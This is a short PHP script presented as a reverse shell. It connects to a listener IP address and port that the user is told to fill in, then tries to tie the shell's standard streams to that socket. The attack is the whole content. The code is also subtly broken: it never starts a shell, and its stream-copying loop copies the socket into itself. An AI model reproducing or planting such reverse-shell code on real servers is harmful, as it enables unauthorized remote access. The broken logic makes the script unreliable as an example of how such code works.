<?php
$ip = '10.2.116.12';  // Change this to your actual listener IP address
$port = 4444;              // Change this to your actual listener port

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
    echo "Error: $errno - $errstr<br />\n";
    die();
}

// Duplicate the socket for stdin, stdout and stderr
foreach ([0, 1, 2] as $fd) {
    stream_set_blocking($sock, false);
    stream_set_blocking(STDIN, false);
    stream_copy_to_stream($sock, $fd === 0 ? STDIN : $sock);
    stream_copy_to_stream($fd === 0 ? STDIN : $sock, $sock);
}

fclose($sock);
?>
